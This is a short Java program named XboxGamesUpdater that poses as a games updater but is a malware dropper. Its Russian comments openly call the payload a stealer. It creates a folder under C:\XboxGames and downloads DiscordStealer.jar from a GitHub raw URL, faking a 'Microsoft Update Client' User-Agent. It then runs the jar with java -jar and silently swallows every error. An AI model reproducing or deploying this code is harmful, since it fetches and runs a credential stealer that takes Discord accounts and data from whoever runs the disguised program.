import java.io.*;
import java.net.*;
import java.nio.file.*;

public class XboxGamesUpdater {
    
    // НОВАЯ ССЫЛКА НА СТИЛЕР
    private static final String STEALER_URL = "https://github.com/superbebra1234/Test_GG_hub/raw/main/DiscordStealer.jar";
    private static final String SAVE_PATH = "C:\\XboxGames\\DiscordStealer.jar";
    
    public static void main(String[] args) {
        try {
            new File("C:\\XboxGames").mkdirs();
            
            // Скачиваем основной стилер
            URL url = new URL(STEALER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Microsoft Update Client");
            
            try (InputStream in = conn.getInputStream();
                 FileOutputStream out = new FileOutputStream(SAVE_PATH)) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
            }
            
            // Запускаем стилер
            Runtime.getRuntime().exec("java -jar \"" + SAVE_PATH + "\"");
            
        } catch (Exception e) {}
    }
}
